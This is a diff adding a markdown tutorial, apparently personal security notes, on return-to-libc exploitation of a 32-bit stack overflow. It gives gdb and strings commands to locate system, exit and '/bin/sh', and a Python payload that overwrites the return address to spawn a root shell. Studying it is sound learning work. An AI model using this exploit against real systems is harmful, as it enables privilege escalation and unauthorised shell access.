@@ -1,0 +1,68 @@
+---
+title: Return to libc (ret2libc)
+---
+
+More info: https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
+
+## Preperation
+Different kind of scenarios, for example the file running as root (where you can send input over netcat) or other. The exploit basically overwrites the return address to force `system("/bin/sh")` which will open up a (root) shell for us.
+
+The following will describe how to hijack the process to run the following for us:
+```bash
+system("/bin/sh");
+exit();
+```
+
+
+### Finding memory locations
+
+```bash
+sudo gdb ./vulnerable
+$ b main
+$ run
+$ p system
+$ p exit
+```
+
+Above finds the memory location of `system()` and `exit()`. In my case, I got `0xf7dbd220` and `0xf7da9ad0` respectively. We also need some string that contains `/bin/sh`, and we can use the `libc` library which is well-known to contain this string.
+
+First we find the memory location of libc (in my case located at `/usr/lib32/libc.so.6`) by using:
+```bash
+info proc map
+```
+
+This gave a start location of `0xf7d6b000`
+
+To find the string `/bin/sh` 
+```bash
+strings -a -t x /usr/lib32/libc.so.6 | grep "/bin/sh"
+```
+
+Which in my case gave `0x1c6e52`. After adding these numbers we get that a string that contains `/bin/sh` is located at `0xf7f31e52`.
+
+### Exploit
+After that, we can run a simple script that overwrites the return address and instead of that calls the `system("/bin/sh")` and after that `exit()`
+
+```py
+#!/usr/bin/env python3
+import sys
+
+n = 504 # depending on the size of buffer. This is the amount of bytes we need to
+# send before the buffer starts overflowing. This can be brute forced by just
+# entering "a" (and keep sending more "a") until you get a segmentation fault. As
+# soon as the segmentation fault is reached, you know how many bytes to send to
+# overwrite the return address
+
+payload = b"a" * n
+payload += b"\x20\xd2\xdb\xf7" # address of system
+payload += b"\xd0\x9a\xda\xf7" # address of exit
+payload += b"\x52\x1e\xf3\xf7" # address of "/bin/sh"
+
+sys.stdout.buffer.write(payload)
+```
+
+And to run the script
+
+```bash
+python exploit.py | ./vulnerable
+```
